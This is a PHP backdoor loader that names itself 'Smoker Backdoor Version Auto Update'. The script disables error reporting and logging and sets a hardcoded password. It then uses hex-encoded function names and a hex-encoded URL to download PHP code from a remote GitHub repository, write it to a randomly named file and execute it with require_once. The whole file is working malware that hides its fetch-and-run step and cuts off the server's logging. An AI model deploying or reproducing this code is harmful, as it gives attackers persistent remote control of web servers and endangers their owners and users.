<?php

#######################################
# Smoker Backdoor Version Auto Update #
#######################################

error_reporting(0);
session_start();
@clearstatcache();
@ini_set('error_log', null);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
$passwd = "smoker";

function smoke($str)
{

    $n = '';

    for ($i = 0; $i < "\x73\x74\x72\x6c\x65\x6e"($str) - 1; $i += 2) {

        $n .= "\x63\x68\x72"("\x68\x65\x78\x64\x65\x63"($str[$i] . $str[$i + 1]));

    }
    
    return $n;

}

$_[0] = "\x73\x6d\x6f\x6b\x65"("66696c655f6765745f636f6e74656e7473")("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x61\x77\x2e\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6f\x6e\x74\x65\x6e\x74\x2e\x63\x6f\x6d\x2f\x41\x66\x72\x69\x7a\x61\x6c\x6c\x2f\x53\x6d\x6f\x6b\x65\x72\x2d\x42\x61\x63\x6b\x64\x6f\x6f\x72\x2f\x6d\x61\x73\x74\x65\x72\x2f\x75\x70\x64\x61\x74\x65\x2e\x70\x68\x70");
$_[1] = "smoker_core_" . rand(00000000, 99999999) . ".smokercore";
$smokercore = fopen($_[1], "w");
fwrite($smokercore, $_[0]);
fclose($smokercore);
require_once($_[1]);
